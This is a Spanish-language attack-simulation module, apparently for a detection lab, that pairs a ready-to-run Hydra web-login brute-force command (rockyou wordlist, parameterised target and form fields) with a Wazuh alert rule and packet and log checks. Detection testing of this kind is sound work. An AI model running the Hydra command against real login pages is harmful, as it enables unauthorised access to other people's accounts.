# MOD12 — Fuerza Bruta Web (Hydra)
ID: BF-002 | MITRE: T1110 | Wazuh Rule: 100511 | Risk: HIGH

## Comando (INMUTABLE)
sudo hydra -l {{username}} -P /usr/share/wordlists/rockyou.txt {{target}} http-post-form '{{login_path}}:{{post_body}}:{{fail_string}}'

## Parámetros
| name        | type | default                              | required |
|-------------|------|--------------------------------------|----------|
| target      | text | ""                                   | true     |
| username    | text | admin                                | true     |
| login_path  | text | /login                               | true     |
| post_body   | text | username=^USER^&password=^PASS^      | true     |
| fail_string | text | Invalid                              | true     |

## Logger (INMUTABLE)
logger -t CyberShield -p local0.alert "SEC_VIOLATION: Web Brute Force attack detected against {{target}} user {{username}} - MITRE:T1110"

## Regla Wazuh (INMUTABLE)
<rule id="100511" level="12">
  <if_sid>1002</if_sid>
  <match>SEC_VIOLATION: Web Brute Force</match>
  <description>ALERTA CYBERSHIELD: Ataque de fuerza bruta web detectado</description>
  <mitre><id>T1110</id></mitre>
</rule>

## Nota crítica
Ajustar login_path, post_body y fail_string según la aplicación objetivo.
^USER^ y ^PASS^ son marcadores de Hydra, no cambiar.

## Verificación en Kali (ejecutar en paralelo al ataque)
```bash
sudo tcpdump -i eth0 port 80 or port 443 -nn 2>/dev/null | head -10
sudo tail -f /var/log/apache2/access.log 2>/dev/null | grep "POST"
```
